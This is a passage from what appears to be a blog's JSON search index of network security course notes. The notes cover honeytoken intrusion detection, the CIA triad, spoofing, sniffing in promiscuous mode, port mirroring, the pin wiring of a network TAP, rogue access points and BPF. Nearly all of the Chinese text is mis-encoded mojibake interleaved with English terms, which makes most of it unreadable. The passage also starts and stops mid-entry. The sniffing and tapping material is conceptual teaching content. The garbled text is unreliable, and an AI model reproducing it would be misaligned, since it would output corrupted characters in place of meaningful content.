æ¯”å¦‚åœ¨æ•°æ®åº“ä¸­æœ‰ä¸€æ¡è™šå‡çš„ä¿¡æ¯ï¼Œæ²¡æœ‰ä»»ä½•å®é™…çš„ä»·å€¼ï¼Œåœ¨ç”Ÿäº§è¿‡ç¨‹ä¸­ä¹Ÿä¸ä¼šè®¿é—®è¿™æ¡æ•°æ®ï¼Œä½†æ˜¯ä¸€æ—¦è¢«è®¿é—®äº†ï¼Œå°±è¡¨ç¤ºæœ‰å…¥ä¾µå‘ç”Ÿäº†ã€‚ è¿™ç§æ–¹å¼æ›´ä¸ºç®€å•æ˜“ç”¨ï¼Œä¸éœ€è¦éƒ¨ç½²å¤æ‚çš„èœœç½ç³»ç»Ÿï¼Œä¹Ÿå¯ä»¥è¯†åˆ«å‡ºæ”»å‡» \u0026lt;2022-05-29 Sun 10:52\u0026gt;","date":"2022-05-28T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/nse_week_7_intrusion_detection_and_prevention/","title":"NSE Week 7: Intrusion detection and prevention"},{"content":"NSE Week 1: Module introduction, security concepts and security attacks What is Network Security?  Cyber security æ˜¯å…³äºä¸ªäººå’Œç»„ç»‡å¦‚ä½•å‡å°‘ cyber attack çš„é£é™©  Network security æ˜¯å…³äºä¸ªäººå’Œç»„ç»‡å¦‚ä½•å‡å°‘ç½‘ç»œæ”»å‡»çš„é£é™©   Risk é£é™© : æ˜¯å…³äºæ¼æ´åˆ©ç”¨ä»è€Œå¯¹è´¢äº§é€ æˆæŸå¤±çš„å¯èƒ½æ€§ Security Concepts é¦–å…ˆæˆ‘ä»¬å†æ¥å›é¡¾ä¸€ä¸‹Cyber securityä¸­ï¼Œæœ€é‡è¦çš„CIAçš„æ¦‚å¿µ  Confidentiality  ç¡®ä¿ä¿å¯†çš„ä¿¡æ¯ä¸æš´éœ²ç»™æœªç»æˆæƒçš„äººå‘˜  Loss of confidentiality = unauthorised disclosure of information    Integrity   ç¡®ä¿ä¿¡æ¯å’Œç¨‹åºåªä¼šè¢«æˆæƒçš„äººå‘˜æ‰€ä¿®æ”¹ä¸å¤„ç†   Loss of integrity = the unauthorised modification or destruction of information    Availability   ç¡®ä¿ç³»ç»Ÿæ­£å¸¸è¿è¡Œå¹¶ä¸”ä¸ä¼šæ‹’ç»æˆæƒçš„ç”¨æˆ·çš„è®¿é—®   Loss of availability = the destruction of access to information/system and the destruction of use of information/system     CIAçš„é‡è¦æ€§éœ€è¦è§†æƒ…å†µè€Œå®šï¼Œå¯¹äºä¸åŒçš„èµ„æº/ç³»ç»Ÿï¼Œæˆ‘ä»¬éœ€è¦æŒ‡å®šä¸åŒçš„CIAçš„æ ‡å‡† More properties in Cyber security   Authentication ç¡®ä¿æ¯ä¸€ä¸ªç”¨æˆ·çš„çœŸå®èº«ä»½éƒ½æ˜¯ä»–ä»¬æ‰€ç”³æ˜çš„ä¸€è‡´  Non-repudiation ç¡®ä¿ä¿¡æ¯ä¼ è¾“çš„åŒå‘ä¸èƒ½å¦è®¤ä»–ä»¬æ¥å—æˆ–è€…å‘é€è¿‡ä¿¡æ¯  Code validation ç¡®ä¿è½¯ç¡¬ä»¶æ˜¯å¥å…¨çš„ï¼ˆsoundï¼‰ï¼Œå¹¶ä¸”æ£€æŸ¥æ¼æ´   OSI Security Architecture æ¥ä¸‹æ¥æˆ‘ä»¬æ¥ä»‹ç»ä¸€ä¸‹OSIçš„å®‰å…¨æ¡†æ¶   Security attack : - ä»»ä½•å¯¹ç»„ç»‡çš„ä¿¡æ¯å®‰å…¨é€ æˆå±å®³çš„è¡Œä¸ºéƒ½ç§°ä¸º security attack  Passive or Active     Security mechanism : - ä¸€ä¸ªç”¨æ¥ä»security attackä¸­æ£€æµ‹ï¼Œé˜²æ­¢å’Œæ¢å¤çš„æœºåˆ¶  ä¾‹å¦‚æµé‡æ£€æµ‹ï¼Œé¢„é˜²å…¥ä¾µ     Security service : - ä¸€é¡¹ç”¨æ¥ä¿æŠ¤ç»„ç»‡ä¸­çš„æ•°æ®å¤„ç†ç³»ç»Ÿçš„æœåŠ¡  åŒ…å«å¤šä¸­Security mechanismsæ¥å¯¹æŠ—security attacks      Philosophy taken to counterattacking   Deter : - ç»„ç»‡å…¥ä¾µçš„å‘ç”Ÿï¼ˆåœ¨å…¶å‘ç”Ÿä¹‹å‰è¿›è¡Œç»„ç»‡ï¼‰ï¼Œå³ä½¿ç”¨ fencing å›´æ , lighting å®Œå…¨ç…§æ˜, signs å‡ºå…¥ç­¾å ç­‰æ–¹å¼å¯¹çŠ¯ç½ªè€…è¿›è¡Œè¢«åŠ¨å¨æ…‘ï¼Œä»æœ€å¼€å§‹å°±æ‰¼æ€å…¥ä¾µçš„å¿µå¤´  ä½¿æ”»å‡»å˜å¾—å›°éš¾ï¼Œè®©attackerä¸»åŠ¨æ”¾å¼ƒ     Detect : - æ£€æµ‹å…¥ä¾µçš„è¡Œä¸ºï¼Œä¾‹å¦‚ CCTV ç›‘æ§, ç”¨æ¥ç›‘æ§å’Œè®°å½•æ‰€æœ‰çš„å…¥ä¾µè¡Œä¸º  Intrusion detection software  Traffic analysis and machine learning to detect abnormities     Deny : - æ‹’ç»æœªç»æˆæƒçš„è®¿é—®ï¼Œé€šè¿‡ä¸€äº›è®¤è¯ç³»ç»Ÿæ¥ä¸»åŠ¨æ‹’ç»å…¥ä¾µçš„è¡Œä¸ºï¼Œå…¶ä¸­é˜²ç«å¢™å°±å±äº Deny  Authentication, authorisation, freshness     Delay : - å»¶ç¼“å…¥ä¾µçš„é€Ÿåº¦ï¼Œé€šè¿‡è®¾ç½®éšœç¢æ¥å»¶é•¿å…¥ä¾µçš„æ—¶é—´ï¼Œè¿«ä½¿å…¥ä¾µè€…æ”¾å¼ƒæˆ–è€…ç»™äºˆå®‰å…¨å›¢é˜Ÿæ›´å¤šçš„æ—¶é—´  å¢åŠ å¯†é’¥çš„é•¿åº¦     Defend : - ä¸»åŠ¨åœ°å¯¹å…¥ä¾µè€…è¿›è¡Œæ‰“å‡»ï¼Œé€šè¿‡å®‰å…¨å›¢é˜Ÿæˆ–è€…è­¦æ–¹çš„è¡ŒåŠ¨æ¥ç»„ç»‡å…¥ä¾µ   Security Mechanisms  Specific security mechanisms  May be incorporated into the appropriate protocol layer  Provide some of the OSI security service: authentication, access control, data confidentiality, data integrity, and non-repudiation  Very much related to popular security properties    Non-specific security mechanisms  Not specific to any particular OSI security service or protocol layer     Cryptographic Techniques å¯†ç å­¦æä¾›äº†å¾ˆå¤šå®‰å…¨æœåŠ¡ï¼Œä¾‹å¦‚åŠ å¯†ï¼Œè§£å¯†ï¼Œæ•°æ®å®Œæ•´æ€§ï¼Œè®¤è¯äº¤æ¢ï¼Œå¯†ç å­˜å‚¨ç­‰æœåŠ¡ Encipherment åŠ å¯†é€šè¿‡å°†æ˜æ–‡è¿›è¡ŒåŠ å¯†ï¼Œä»è€Œæ¥ä¿è¯confidentiality Two crytovariables in cryptographic funtions  The key å¯†é’¥ (can be both symmetric or asymmetric)  The initial vector (æˆ‘ä»¬åœ¨å¯†ç å­¦ä¸­è®²è¿‡çš„éšæœºæ•°ï¼Œç”¨æ¥å‚ä¸åŠ å¯†çš„è¿‡ç¨‹ï¼Œæ¯”å¦‚åœ¨DES CBCä¸­)   Cryptographic Protocols æ˜¯é€šä¿¡çš„åŒæ–¹é€šè¿‡åŠ å¯†ä¼ é€’çš„ä¿¡æ¯æ¥é¢„é˜²æ”»å‡»  Possible attacks?  Cyptoanalysis: recover the plaintext from ciphertext without knowing the key  Message/field insertion, deleteion and change (ç ´åå®Œæ•´æ€§)  Relay: å¯¹å…ˆå‰åˆæ³•çš„å¯†æ–‡é‡å¤åˆ©ç”¨  Man-in-the-middle attack    Countermeasure   Countermeasures for cryptoanalysis  Longer keys (e.g., 2048 bits for RSA, used to be 256 bits)  èˆå¼ƒå¼±å¯†é’¥ï¼ˆæ¯”å¦‚å…¨æ˜¯0çš„æˆ–è€…å…¨æ˜¯1çš„ï¼‰     Countermeasures for message/field insertion, deletion and change  Integrity check (hash, MAC, digital signature)     Countermeasures for replay attack   Provide freshness in protocol run   Timestamp, sequence number, nounce     Countermeasure for man-in-the-middle attack   Cryptographic protocols should be designed and verified   Use formal methods to evaluate security properties of cryptographic protocols       Digital Signature ä¸»è¦é€šè¿‡å°†é¢å¤–çš„bité™„åŠ åœ¨ä¼ è¾“çš„æ•°æ®ä¸Šï¼Œä»è€Œè®©æ¥æ”¶è€…å¯ä»¥éªŒè¯æ•°æ®çš„ Integrity å¯ä»¥ç”¨æ¥æä¾›authentication, integrity, and non-repudiation,å› ä¸ºæ•°å­—ç­¾ååˆ©ç”¨asymmetricéå¯¹ç§°åŠ å¯†ï¼Œä½¿ç”¨å‘é€æ–¹çš„private keyè¿›è¡ŒåŠ å¯†ï¼Œæ¥æ”¶è€…åˆ™å¯ä»¥ç”¨public keyæ¥è¿›è¡Œè§£å¯† Authentication Exchange ç”¨äºå‘é€æ–¹å’Œæ¥æ”¶æ–¹åŒæ–¹äº’ç›¸ç¡®è®¤èº«ä»½ å¸¸è§çš„Authenticationçš„æ–¹æ³•ï¼š  Something you know, e.g., password  Something you are, e.g., fingerprint  Something you have, e.g., smart card, your phone  2-factor or multifactor authentication åŒé‡/å¤šé‡è®¤è¯     å¦‚ä½•é€‰æ‹©èº«ä»½è®¤è¯çš„æ–¹æ³•ï¼Ÿ\n  å¦‚æœé€šä¿¡çš„åŒæ–¹å½¼æ­¤å¯ä»¥ä¿¡ä»»ï¼ŒåŒæ—¶é€šä¿¡æ˜¯å¯é çš„  ä½¿ç”¨å¯†ç      å¦‚ä½•é€šä¿¡çš„åŒæ–¹æ˜¯å¯ä»¥ä¿¡ä»»çš„ï¼Œä½†æ˜¯é€šä¿¡ä¸å¯é   ä½¿ç”¨å¯†ç ä»¥åŠåŠ å¯†åè®®     å¦‚ä½•ä»€ä¹ˆéƒ½ä¸å¯ä»¥ä¿¡ä»»  ä½¿ç”¨å¯†ç ï¼ŒåŠ å¯†åè®®ä»¥åŠnon-repudiation service         æˆ‘ä»¬çœŸçš„éœ€è¦å¯†ç å—ï¼Ÿ\nå‰‘æ¡¥å¤§å­¦å‘æ˜äº†ä¸€ç§å¯æºå¸¦çš„è®¾å¤‡ï¼špico,å…¶å­˜å‚¨äº†æ‰€æœ‰çš„credentialsä¿¡æ¯ï¼Œå¹¶ä¸”é€šè¿‡ä¸€ç³»åˆ—ä¼ æ„Ÿå™¨ï¼Œä»¥åŠç”Ÿç‰©ç‰¹å¾ä¿¡æ¯æ¥é˜²æ­¢ä¸¢å¤±åçš„ä¿¡æ¯æ³„éœ²ã€‚   Other Security mechanisms (X.800)  Access control  åªå…è®¸æœ‰é™çš„å¯æˆæƒäººå‘˜çš„è®¿é—®    Traffic padding  åœ¨æ•°æ®æµä¸­åŠ å…¥ä¸€äº›bitsï¼Œä½¿æµé‡åˆ†æå—é˜»ï¼Œä»è€Œä¿è¯äº†confidentialityä¿å¯†æ€§    Notarisation å…¬è¯  ç»è¿‡ç¬¬ä¸‰æ–¹æ¥ä¿è¯å®‰å…¨çš„ä¿¡æ¯ä¼ è¾“    Security audit trail  æ”¶é›†ä¿¡æ¯æ¥è¿›è¡Œå®‰å…¨å®¡è®¡    Security recovery æ•°æ®æ¢å¤  Economics  å¢åŠ attackçš„æˆæœ¬ï¼Œæ¯”å¦‚å¦‚æœå‘é‚®ä»¶éœ€è¦èŠ±é’±ï¼Œé‚£åƒåœ¾é‚®ä»¶åŠ¿å¿…ä¼šå‡å°‘  åˆæˆ–è€…åœ¨Bitcoinå½“ä¸­ï¼Œå‘èµ·DDoSæ”»å‡»å°±ä»¥èŠ±è´¹å¤§é‡çš„transaction fee    Deception  é€šè¿‡æš´éœ²æ”»å‡»è€…è‡ªå·±ï¼Œä¾‹å¦‚ä½¿ç”¨èœœç½æ¥è·å–æ”»å‡»è€…çš„ä¿¡æ¯     Jamming, Sniffing and Spoofing Jamming Jammingé€šè¿‡å‘å‡ºå¤§é‡çš„noiseæ¥å½±å“åŸæœ¬çš„é€šä¿¡ï¼Œå½±å“availability ä¾‹å¦‚å±è”½Wifiä¿¡å· ä¹Ÿå¯ä»¥ç”¨åœ¨åˆæ³•çš„æ¸ é“ä¸Šï¼Œæ¯”å¦‚ç”¨åœ¨è€ƒåœºæˆ–è€…éœ€è¦é˜»æ–­ç½‘ç»œçš„åœ°æ–¹ Sniffing Sniffingæ˜¯æ¥ç›‘å¬å…¶ä»–ç”¨æˆ·çš„ä¿¡æ¯ Network interface card (NIC ç½‘å¡)å¿…é¡»è®¾ç½®åœ¨ promiscuous mode æ¥è·å–æ‰€æœ‰çš„åŒ… å¯ä»¥ç”¨æ¥  å·å¬æ•°æ®åŒ…ä¸­æ²¡æœ‰åŠ å¯†çš„ä¿¡æ¯  æ•æ‰ä¿¡æ¯è¿›è€Œä½¿ç”¨relay attack   Spoofing é€šè¿‡ä¼ªè£…æ¥è¿›è¡Œæ”»å‡»ï¼Œå¯ä»¥ä¿®æ”¹çš„å†…å®¹  Application layer: DNS address, e.g., an URL, an email address  Network layer: IP address  Link layer: MAC address   Spoofingçš„ç§ç±»  Email spoofing: phising  Text message spoofing: smishing  Call ID spoofing  URL spoofing: phishing website  DNS spoofing: cache poisoning  IP address spoofing: change the source address in an IP packet  MAC spoofing: change the MAC address of NIC   Model of Network Security  Cryptographic protocol  A, Béƒ½æœ‰è‡ªå·±çš„symmetric key (K_A, K_B), åŒæ—¶Aæƒ³è¦ç”Ÿæˆä¸€ä¸ªå…±åŒçš„keyå¹¶ä¸”åˆ†äº«ç»™B  Aå‘é€ç»™Kï¼Œç”¨E_AåŠ å¯†çš„æ–°key K_ABï¼ŒåŒæ—¶æŒ‡ç¤ºè¿™æ˜¯Aä¸Bçš„å…±åŒKey  Kè¿”å›ç»™A ç”¨E_BåŠ å¯†çš„å…±åŒKey K_ABä»¥åŠæ ‡è¯†è¿™ä¸ªKeyæ˜¯ç”±ID_BåŠ å¯†çš„  Aå°†E_B(K_AB)ä»¥åŠåŠ å¯†çš„æ•°æ®å‘é€ç»™Bï¼ŒBå°±å¯ä»¥ç”¨è‡ªå·±çš„E_Bå…ˆè§£å¯†ï¼Œç„¶åå†ç”¨å¾—åˆ°E_ABæ¥è§£å¯†æ•°æ®    Attackeré€šè¿‡æ‹¦æˆªå¹¶ä¿®æ”¹Aå‘é€ç»™Kçš„è¯·æ±‚ï¼Œä»è€Œå¯ä»¥è·å–K_ABçš„å€¼ï¼Œè¿›è€Œå¯ä»¥ç›‘å¬æ‰€æœ‰çš„è¯·æ±‚ ","date":"2022-05-26T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/nse_week_1_module_introduction_security_concepts_and_security_attacks/","title":"NSE Week 1: Module introduction, security concepts and security attacks"},{"content":"NSE Week 2: TCP/IP protocol architecture, sniffing and traffic analysis TCP/IP protocol architecture ä»€ä¹ˆæ˜¯ç½‘ç»œåè®®ï¼Ÿ Protocol å°±æ˜¯ä¸€ç»„ç›¸åŒé€šä¿¡å±‚ä¸Šçš„é€šä¿¡è§„åˆ™ ä¸»è¦çš„å†…å®¹ï¼š  Syntaxï¼šé€šä¿¡ä¿¡æ¯çš„æ ¼å¼  Semanticsï¼šå¦‚ä½•æ§åˆ¶ä¿¡æ¯ä»¥åŠé”™è¯¯  Timingï¼šä¼ è¾“ä»¥åŠæ•°æ®äº¤æ¢çš„é€Ÿåº¦ï¼Œä»¥åŠæ¬¡åº   TCP/IP æ¨¡å‹  æ¯ä¸€ä¸ªåè®®éƒ½ä½œä¸ºAlice \u0026amp; Bobåœ¨ç›¸åŒå±‚ä¸Šé¢çš„é€šä¿¡è§„åˆ™ æˆ‘ä»¬ç”¨ä¸€ä¸ªä¾‹å­æ¥ç®€å•æ¦‚è¿°ä¸€ä¸‹æ¯ä¸€å±‚çš„ä½œç”¨  æ¯”å¦‚Aliceæƒ³è¦å‘ä¸€ä¸ªå¿«é€’ç»™Bobï¼Œé‚£ä¹ˆå¿«é€’é‡Œçš„è´§ç‰©å°±æ˜¯Applicationï¼Œæ˜¯Bobéœ€è¦ä½¿ç”¨çš„ç‰©å“ï¼›  é‚£ä¹ˆTransport layerå°±æ˜¯æ˜¯å¦éœ€è¦ç»™å¿«é€’ä¸Šä¿é™©ï¼ŒTCPå°±æ˜¯ä¸Šä¿é™©ï¼ŒUDPå°±æ˜¯ä¸ä¸Šä¿é™©ï¼Œå¦‚æœä¸œè¥¿è´µé‡ï¼Œé‚£ä¹ˆå°±è¦TCPï¼Œå¦‚æœä¸¢äº†ä¹Ÿæ²¡å…³ç³»å°±ç”¨UDP  æ¥ä¸‹æ¥å¿«é€’å‘å‡ºæ¥äº†ï¼Œå¿«é€’å•ä¸Šé¢è¦å†™åœ°å€ï¼Œåœ°å€å°±æ˜¯IPåœ°å€ä¹Ÿå°±æ˜¯Internet layerçš„headerçš„åŒæ–¹çš„IPåœ°å€ï¼Œxxçœxxå¸‚xxå°åŒºè¿™äº›å°±æ˜¯ä¸€ä¸ªä¸ªç½‘ç»œï¼ŒInternet layerå°±è´Ÿè´£è¿›è¡Œroutingè·¯ç”±ï¼Œæ¥æ‰¾åˆ°å‘å¾€è¿™äº›åŒºåŸŸçš„è·¯å¾„  Network accesså°±æ˜¯é‚®ç¼–ï¼Œåœ¨ä¸­å›½æ²¡æœ‰å¾ˆå¤§çš„ä½“ç°ï¼Œä½†æ˜¯åœ¨è‹±å›½ï¼Œæ¯ä¸€å¹¢æ¥¼éƒ½å¯¹åº”äº†ä¸€ä¸ªé‚®ç¼–ï¼Œä¸”æ˜¯å…¨è‹±å”¯ä¸€çš„ï¼Œä¹Ÿå°±æ˜¯ç½‘ç»œå±‚çš„MACåœ°å€  æœ€åPhysicalç‰©ç†å±‚å°±æ˜¯ç”¨é£æœºï¼Œé«˜é“ï¼Œè½®èˆ¹ç­‰æ–¹å¼é€è´§ï¼Œä¹Ÿå°±å¯¹åº”äº†ï¼Œå…‰çº¤ï¼ŒåŒç»çº¿è¿™äº›ä¼ è¾“æ–¹å¼   æ¥ç€æˆ‘ä»¬ç”¨ä¸€ä¸ªå…·ä½“çš„HTTPé€šä¿¡çš„ä¾‹å­æ¥æè¿°ä¸€äº›ç»†èŠ‚ HTTPæ˜¯ä¸€ä¸ªåº”ç”¨å±‚çš„åè®®ï¼Œé‚£ä¹ˆé€šä¿¡çš„åŒæ–¹éƒ½å°†æ˜¯åº”ç”¨å±‚ï¼Œè€Œå®é™…ä¼ è¾“åˆ°å¯¹æ–¹åº”ç”¨å±‚çš„åº”ç”¨ä¸Šï¼Œå°±éœ€è¦å±‚å±‚å°è£…ä¿¡æ¯ï¼Œç„¶åç”±è·¯ä¸Šçš„è·¯ç”±å™¨ï¼Œäº¤æ¢æœºè¿›è¡Œæ‹†åŒ…ä¹‹åä¸€æ­¥æ­¥ä¼ é€’ã€‚   ç½‘å…³å’Œè·¯ç”±å™¨ä¼šæ ¹æ®IP headerè¿›è¡Œè·¯ç”±  Sniffing Sniffing å—…æ¢ï¼Œattackeré€šè¿‡ç›‘å¬ç½‘ç»œä¸­çš„æµé‡æ¥è·å–ä»–ä»¬æƒ³è¦çš„ä¿¡æ¯ï¼Œç”šè‡³åšå‡ºä¿®æ”¹ã€‚ å½“ç„¶ä¹Ÿå¯ä»¥ç”¨äºç½‘ç»œçš„debugå’Œè¯Šæ–­ã€‚ Network interface card (NIC ç½‘å¡)å¿…é¡»è®¾ç½®åœ¨ promiscuous mode æ¥è·å–æ‰€æœ‰çš„åŒ… å¯ä»¥ç”¨æ¥  å·å¬æ•°æ®åŒ…ä¸­æ²¡æœ‰åŠ å¯†çš„ä¿¡æ¯  æ•æ‰ä¿¡æ¯è¿›è€Œä½¿ç”¨relay attack   Promiscuous mode æˆ‘ä»¬çš„ç½‘å¡network interface card (NIC) æœ‰ä¸¤ç§æ¨¡å¼ï¼š  Promiscuous ä¸åŠ é€‰æ‹©çš„æ¨¡å¼:è·å–æ‰€æœ‰ç½‘ç»œä¸­çš„æ•°æ®åŒ…  Non-promiscuousï¼šä¸¢å¼ƒæ‰€æœ‰ä¸ç»è¿‡è‡ªå·±çš„æ•°æ®åŒ…   å¦‚æœè¦å®ç°å—…æ¢ï¼Œå°±å¿…é¡»è®¾ç½®ä¸º Promiscuous mode åŒæ—¶æˆ‘ä»¬å¿…é¡»å¤„äºHubsæˆ–è€…WiFiçš„ç½‘ç»œæ¡ä»¶ä¸‹ï¼Œå› ä¸ºè¿™æ ·æ‰èƒ½æ”¶åˆ°å› ä¸ºå¹¿æ’­è€Œæ¥å—åˆ°çš„æ‰€æœ‰æ•°æ®åŒ… å¦‚äº¤æ¢æœºè¿™ç§æ‹¥æœ‰å•ç‹¬çš„å¹¿æ’­åŸŸçš„å°±ä¸è¡Œï¼Œæ— æ³•æ•æ‰åˆ°ä¿¡æ¯ Active Interception - port mirroring Port Mirroring ä¹Ÿè¢«ç§°ä½œ SPAN (Switch Port Analyser) é€šè¿‡é…ç½®äº¤æ¢æœºï¼Œä½¿å…¶å°†ä¸€å¯¹portï¼ˆæˆ–è€…æ•´ä¸ªVLANï¼‰æ‰€äº¤æ¢çš„ä¿¡æ¯ï¼Œæ‹·è´ä¸€ä»½ä¼ è¾“åˆ°SPAN portsï¼Œè¿›è€ŒåŠ ä»¥åˆ†æåˆ©ç”¨ å¥½çš„ç”¨é€”ï¼šç½‘ç»œè¯Šæ–­ï¼Œå…¥ä¾µæ£€æµ‹åˆ†æ æ¶æ„çš„ç”¨é€”ï¼šå½“æ”»å‡»è€…å¯ä»¥é€šè¿‡ç‰©ç†è¿æ¥è¿™å°äº¤æ¢æœºï¼Œä»–ä»¬å°±å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„ä¼ è¾“æµé‡ Active Interception: network tapping Network tappingå°±æ˜¯å°†åŸæœ¬ç›´è¿çš„ä¸¤å°è®¾å¤‡ï¼Œè¿å…¥TAPåï¼Œå¯ä»¥è®¿é—®ä»–ä»¬ä¹‹é—´çš„é€šä¿¡ï¼Œä»è€ŒåŠ ä»¥åˆ†æä¸åˆ©ç”¨ TAP = Traffic Access Point or Test Access Point æ˜¯ç‰©ç†å±‚çš„ä¸€ä¸ªè®¾å¤‡  åŸæœ¬çš„è¿æ¥æ–¹å¼ï¼šç›´è¿  è¿åœ¨Network TAPä¸Šä¹‹åï¼Œå°±å¯ä»¥ç”¨Wiresharkæ¥è¿›è¡Œç›‘å¬äº†  å…¶å…·ä½“çš„åŸç†å°±æ˜¯é€šè¿‡RJ45çº¿ä¸Šçš„å¼•è„šè¿›è¡Œè¿æ¥ï¼ŒPins1 \u0026amp; Pins2 ç”¨äºè½¬å‘æ•°æ®;Pins3 \u0026amp; Pins6 ç”¨äºæ¥æ”¶æ•°æ®    TAP A æ¥å£çš„Pins3 and Pins6 ï¼ˆæ¥å—æ•°æ®ï¼‰åˆ†åˆ«æ¥ä¸Host A \u0026amp; Host B çš„Pins1 å’Œ Pins2 (ä¼ è¾“æ•°æ®ï¼‰ç›¸è¿æ¥ï¼Œä½¿HostAä¼ è¾“ç»™HostBçš„æ•°æ®éƒ½ç”±TAP Aæ‰€æ¥å—  HostA_pins1 -\u0026gt; TapA_pins3 -\u0026gt; HostB_pins1  HostA_pins2 -\u0026gt; TapA_pins6 -\u0026gt; HostB_pins2     TAP B æ¥å£çš„Pins3 and Pins6 ï¼ˆæ¥å—æ•°æ®ï¼‰åˆ†åˆ«æ¥ä¸Host A \u0026amp; Host B çš„Pins3 å’Œ Pins6ï¼ˆæ¥æ”¶æ•°æ®ï¼‰ç›¸è¿æ¥ï¼Œä½¿HostBä¼ è¾“ç»™HostAçš„æ•°æ®éƒ½ç”±TAP Bæ‰€æ¥å—  HostA_pins3 -\u0026gt; TapB_pins3 -\u0026gt; HostB_pins3  HostA_pins6 -\u0026gt; TapB_pins6 -\u0026gt; HostB_pins6     ä»è€Œä½¿TAP_Aæ¥æ¥æ”¶æ‰€æœ‰å‘å‡ºçš„æ•°æ®ï¼ŒTAP_Båˆ™ä¼šæ¥æ”¶æ‰€æœ‰æ¥æ”¶çš„æ•°æ®ï¼Œä¸€åˆ‡éƒ½ä¼šè¢«æ•æ‰  ä»è€Œä½¿æ‰€æœ‰ABä¹‹é—´çš„æ•°æ®éƒ½å¯ä»¥è¢«æˆ‘ä»¬çš„åˆ†æè½¯ä»¶æ‰€æ•æ‰å’Œåˆ©ç”¨  ä¸è¿‡ä¹Ÿå¯ä»¥ä½¿ç”¨Bypass modeç»•è¿‡æ¨¡å¼æ¥åœæ­¢å¤åˆ¶è½¬å‘  Vampire taps æ‰€è°“çš„â€œé¡ºç€â€ç½‘çº¿ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œç›´æ¥ç”¨RJ-45çš„çº¿å®ç°TAP,æµ·åº•ç”µç¼†ä¹Ÿå¯ä»¥å¦‚æ­¤TAP  WarXing ä½¿ç”¨å¤šç§è®¾å¤‡è¿›è¡Œæ•æ‰  Rouge Access Point Access pointä¸€èˆ¬æ˜¯ç”¨äºåˆ›é€ WLANä¾›å…¶ä»–è®¾å¤‡è¿›è¡Œæ— çº¿è¿æ¥çš„è®¾å¤‡ï¼Œä¸€èˆ¬ç”¨äºä¼ä¸šï¼Œå› ä¸ºå…¶è¦†ç›–é¢ç§¯è¾ƒå¹¿ï¼Œä¸å®¶ç”¨çš„æ— çº¿è·¯ç”±å™¨ä¸åŒçš„æ˜¯ï¼Œå…¶ä¸€èˆ¬æ²¡æœ‰ä»€ä¹ˆç®¡ç†åŠŸèƒ½(e.g., Access control)ï¼Œåªæ˜¯å•çº¯ä¸ºäº†è¿æ¥ é‚£ä¹ˆRoute Access Pointå°±æ˜¯ä¸€ä¸ªattackeråˆ›é€ çš„ä¼ªè£…æˆåˆæ³•çš„WiFiæ¥å¼•è¯±ç”¨æˆ·è¿æ¥ï¼Œä»è€Œå¯ä»¥è·å–ç”¨æˆ·ä¹‹é—´çš„é€šä¿¡ã€‚ä¸€èˆ¬æ¥è¯´attackerä¼šæ¨¡ä»¿WFiçš„SSIDä»¥åŠBSSIDæ¥è¿›è¡Œä¼ªé€   Traffic Analysis Data Acquisition ç»è¿‡Sniffingä¹‹åï¼Œæˆ‘ä»¬æ”¶é›†äº†å¤§é‡çš„æ•°æ®ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±éœ€è¦åˆ†æä¸ç†è§£è¿™äº›æ•°æ®: Who is talking to whom about what? Libpcapï¼šLibrary of packet capture Libpcap å°±æ˜¯ç”¨æ¥åˆ†æè·å–æ•°æ®çš„API è™½ç„¶åå­—ä¸­å¸¦æœ‰packetï¼Œå®é™…ä¸Šæ˜¯ç”¨æ¥capture framesï¼ŒåŒ…æ‹¬æ‰€æœ‰çš„æ•°æ®é“¾è·¯å±‚åˆ°åº”ç”¨å±‚çš„æ•°æ® Network snifferså¯ä»¥åˆ†ææ•æ‰çš„ç½‘ç»œæµé‡ï¼Œå¹¶ä¿å­˜åœ¨ .pcap æ–‡ä»¶å½“ä¸­ å…¶æ ¸å¿ƒæ˜¯BPFï¼š BPF, Berkeley packet filter ä¹‹å‰å­˜åœ¨çš„é—®é¢˜ï¼šæˆ‘ä»¬ä¹‹å‰æåˆ°è¿‡ï¼Œsnifferåœ¨ç½‘å¡å¼€å¯äº† promiscuous modeä¹‹åï¼Œä¼šæ•è·æ‰€æœ‰çš„åŒ…ï¼Œä½†æ˜¯å…¶ä¸­å……æ–¥ç€å¤§é‡çš„æˆ‘ä»¬ä¸æƒ³è¦çš„æ•°æ®åŒ…ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥è¿›è¡Œåˆ†æçš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±ä¼šèŠ±è´¹å¤§é‡çš„CPUèµ„æºåœ¨è¿™äº›ä¸æƒ³è¦çš„æ•°æ®åŒ…ä¸Š BPFè§£å†³äº†è¿™ä¸ªæ•ˆç‡é—®é¢˜ï¼Œé€šè¿‡ï¼š  åœ¨Bufferç¼“å­˜æŒ‡å®šçš„éƒ¨åˆ†ä¹‹å‰å°±è¿›è¡Œè¿‡æ»¤  Filterå¯ä»¥ç”±ç”¨æˆ·è‡ªå®šä¹‰  æ¯”ä¹‹å‰çš„packet capture toolå¿«äº†100å€     BPFçš„å®ç°\nä¸»è¦ç”±ä¸¤ä¸ªéƒ¨åˆ†ï¼š  Network tap ç”¨æ¥snifferè·å–æ•°æ®  Packet filter ç”¨æ¥å¯¹æ•°æ®åŒ…è¿›è¡Œæå‰è¿‡æ»¤ï¼Œè¶Šæ—©è¶Šå¥½        BPF filter model\nBPFçš„è¿‡æ»¤å™¨é€‚ç”¨directed acyclic control flow graph  é€šè¿‡ä¸Šå›¾æˆ‘ä»¬å¯ä»¥çœ‹åˆ°filteræ˜¯å¦‚ä½•é€šè¿‡å„ç§ç”¨æˆ·è‡ªå®šä¹‰çš„æ¡ä»¶æ¥è¿›è¡Œç­›é€‰ï¼Œä»è€Œå†³å®šæ˜¯bufferè¿˜æ˜¯ä¸¢å¼ƒ   Tcpdump å¤§å®¶è€³ç†Ÿèƒ½è¯¦çš„å·¥å…·Tcpdumpå°±æ˜¯åŸºäºBPFæ¥è¿›è¡Œå¼€å‘çš„ï¼Œå…¶æä¾›äº†å¼ºå¤§çš„åŠŸèƒ½æ¥è¿›è¡Œæ•°æ®åŒ…åˆ†æ Wireshark Wiresharkåˆ™æä¾›äº†æ›´åŠ åˆ©äºä½¿ç”¨çš„GUIç•Œé¢ Traffic analysis æœ‰ä¸‰ç§traffic analysisçš„æ–¹æ³•  Protocol analysis: åˆ†ææ•°æ®åŒ…ä¸­çš„åè®®ä¿¡æ¯  Packet analysis: 